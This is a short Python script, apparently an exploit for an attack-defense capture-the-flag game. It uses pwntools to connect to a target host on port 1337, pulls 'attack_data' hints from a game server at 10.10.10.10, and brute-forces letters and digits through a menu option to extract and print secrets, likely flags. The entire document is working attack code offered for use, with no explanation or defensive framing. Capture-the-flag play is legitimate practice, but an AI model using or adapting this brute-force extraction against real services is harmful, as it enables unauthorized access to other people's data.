#!/usr/bin/env python

import sys
from pwn import *
import requests as rq
from string import ascii_letters, digits

host = sys.argv[1]
hints = rq.get('http://10.10.10.10/api/client/attack_data').json()

r = remote(host, 1337)

for hint in hints['shizika'][host]:
    if hint:
        for c in ascii_letters + digits:
            r.recvuntil(b'> ')
            r.sendline(b'2')
            r.recvuntil(b': ')
            r.sendline(hint.encode())
            r.recvuntil(b': ')
            r.sendline(c.encode())
            secret = r.recvuntil(b'\n\n').decode()
            print(secret, flush=True)
